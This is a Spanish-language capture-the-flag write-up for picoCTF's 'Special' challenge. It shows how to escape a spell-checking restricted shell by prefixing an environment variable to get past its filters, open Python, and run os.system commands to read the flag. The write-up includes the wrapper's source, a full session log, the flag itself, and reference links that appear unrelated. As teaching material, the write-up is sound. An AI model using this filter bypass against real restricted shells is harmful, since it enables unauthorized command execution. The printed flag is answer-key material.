## **Descripción**
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.
Additional details will be available after launching your challenge instance.

## Hints
1.- Experiment with different shell syntax
## **Solución** 
Para este reto haremos lo siguiente:
- Primero nos conectamos a un servidor con ssh.
- Al paracer cuando ingresamos se ejecuta un codigo el cual cambia la interfaz.
- Si ingresamos un enter sin nada, podremos ver donde se encuentra este archivo.
- De este manera hacemos uso del siguiente comando Placeholder=abc /usr/bin/python3
	- `laceholder=abc` asigna el valor `abc` a una variable de entorno llamada `Placeholder`, 
	- `/usr/bin/python3` se utiliza para invocar el intérprete de Python 3, que es una ruta común en sistemas Linux. Al escribir este comando, lo que ocurre es que se abre una sesión interactiva de Python 3. Es como si ejecutarámos `python3` directamente desde la terminal, lo que nos lleva a un prompt de Python donde podemos ejecutar código Python
- Una vez en la sesion de python hacemos uso de os.system("ls"), este nos listara los archivos del directorio.
- Con este nos damos cuenta de que hay un directorio llamado blargh, hacemos un os.system("ls blargh") para listar el contenido de este y al parecer ahi esta un txt con la bandera.
- Por ultimo hacemos un os.system("cat blargh/flag.txt") para leer la bandera. 
 

```
Special$ Placeholder=abc cat /usr/local/Special.py
Placeholder=abc cat /usr/local/Special.py 
#!/usr/bin/python3

import os
from spellchecker import SpellChecker
spell = SpellChecker()

while True:
  cmd = input("Special$ ")
  rval = 0
  
  if cmd == 'exit':
    break
  elif 'sh' in cmd:
    print('Why go back to an inferior shell?')
    continue
  elif cmd[0] == '/':
    print('Absolutely not paths like that, please!')
    continue
    
  # Spellcheck
  spellcheck_cmd = ''
  for word in cmd.split():
    fixed_word = spell.correction(word)
    if fixed_word is None:
      fixed_word = word
    spellcheck_cmd += fixed_word + ' '

  # Capitalize
  fixed_cmd = list(spellcheck_cmd)
  words = spellcheck_cmd.split()
  first_word = words[0]
  first_letter = first_word[0]
  if ord(first_letter) >= 97 and ord(first_letter) <= 122:
    fixed_cmd[0] = chr(ord(spellcheck_cmd[0]) - 0x20)
  fixed_cmd = ''.join(fixed_cmd)
  
  try:
    print(fixed_cmd)
    os.system(fixed_cmd)
  except:
    print("Bad command!")

Special$ placeholder=abc /usr/bin/python3

Placeholder=abc /usr/bin/python3 
Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
>>> import os
>>> os.system("ls")
blargh
0
>>> os.system("cat blargh")
cat: blargh: Is a directory
256
>>> os.system("cd blargh")
0
>>> os.system("ls blargh")
flag.txt
0
>>> os.system("cat flag.txt")
cat: flag.txt: No such file or directory
256
>>> os.system("cat /blargh/flag.txt")
cat: /blargh/flag.txt: No such file or directory
256
>>> os.system("cat blargh/flag.txt")


				picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}0


```

## **Notas adicionales**
El módulo `os` proporciona una manera de interactuar con el sistema operativo. Permite ejecutar comandos del sistema, manipular archivos y directorios, obtener información del sistema y muchas otras tareas relacionadas con el sistema operati

## **Referencias**
- [Download code.py](https://artifacts.picoctf.net/c/1/code.py)
- [Download codebook.txt](https://artifacts.picoctf.net/c/1/codebook.txt)